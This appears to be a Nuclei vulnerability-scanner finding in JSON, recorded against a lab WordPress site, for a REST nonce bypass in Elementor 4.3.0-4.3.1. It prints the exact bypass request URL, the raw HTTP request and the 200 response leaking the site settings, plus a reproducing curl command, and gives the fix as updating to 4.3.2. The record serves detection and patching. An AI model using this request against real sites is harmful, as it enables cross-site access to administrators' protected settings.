{"template-id":"elementor-rest-nonce-bypass","template-path":"/templates/template.yaml","template-encoded":"","info":{"name":"Elementor 4.3.0 - 4.3.1 - REST Nonce Bypass","author":["alex700"],"tags":["wordpress","wp","wp-plugin","elementor","csrf","auth-bypass"],"description":"Elementor's Editor Events REST authentication filter in versions 4.3.0 and 4.3.1 trusts an events-route marker anywhere in the request URI. This template logs in through the standard /wp-login.php form with supplied administrator username and password, then compares denied baseline and near-miss requests with access to WordPress settings using the exact marker. The Editor Events experiment must be enabled. Custom login paths, SSO, and MFA are outside the validated login flow; no finding in those configurations does not establish that the issue is absent.\n","impact":"A cross-site request using an administrator's browser session can reach protected REST routes without the required nonce, subject to the route's capability checks and browser cookie policy.\n","reference":["https://patchstack.com/articles/cross-site-request-forgery-in-elementor-plugin-affecting-2-million-sites/"],"severity":"medium","metadata":{"framework":"wordpress","max-request":4,"product":"elementor","vendor":"elementor"},"remediation":"Update Elementor to 4.3.2 or later.\n"},"matcher-name":"dsl-1","type":"http","port":"80","scheme":"http","url":"/http://vulnerable","path":"http://vulnerable","matched-at":"http://vulnerable/?rest_route=/wp/v2/settings\u0026elementor/v1/events/","request":"GET /?rest_route=/wp/v2/settings\u0026elementor/v1/events/ HTTP/1.1\r\nHost: vulnerable\r\nUser-Agent: Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36\r\nCookie: ***\r\nAccept-Encoding: gzip\r\n\r\n","response":"HTTP/1.1 200 OK\r\nContent-Length: 598\r\nAccess-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type\r\nAccess-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link\r\nAllow: GET, POST, PUT, PATCH\r\nCache-Control: no-cache, must-revalidate, max-age=0, no-store, private\r\nContent-Type: application/json; charset=UTF-8\r\nDate: Sun, 25 Oct 2026 20:50:50 GMT\r\nExpires: Wed, 11 Jan 1984 05:00:00 GMT\r\nLink: \u003chttp://vulnerable/wp-json/\u003e; rel=\"https://api.w.org/\"\r\nServer: Apache/2.4.68 (Debian)\r\nX-Content-Type-Options: nosniff\r\nX-Powered-By: PHP/8.3.33\r\nX-Robots-Tag: noindex\r\n\r\n{\"title\":\"Nuclei Elementor lab\",\"description\":\"\",\"url\":\"http:\\/\\/vulnerable\",\"email\":\"labadmin@example.invalid\",\"timezone\":\"\",\"date_format\":\"F j, Y\",\"time_format\":\"g:i a\",\"start_of_week\":1,\"language\":\"en_US\",\"use_smilies\":true,\"default_category\":1,\"default_post_format\":\"0\",\"posts_per_page\":10,\"show_on_front\":\"posts\",\"page_on_front\":0,\"page_for_posts\":0,\"default_ping_status\":\"open\",\"default_comment_status\":\"open\",\"site_logo\":null,\"site_icon\":0,\"elementor_one_welcome_screen_completed\":null,\"elementor_one_dismiss_connect_alert\":null,\"elementor_one_dismiss_elementor_one_subscription_alert\":null}","ip":"172.20.0.4","timestamp":"2026-10-25T20:50:50.288943424Z","curl-command":"curl -X 'GET' -d '' -H 'Cookie: ***' -H 'Host: vulnerable' -H 'User-Agent: Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' 'http://vulnerable/?rest_route=/wp/v2/settings\u0026elementor/v1/events/'","matcher-status":true}
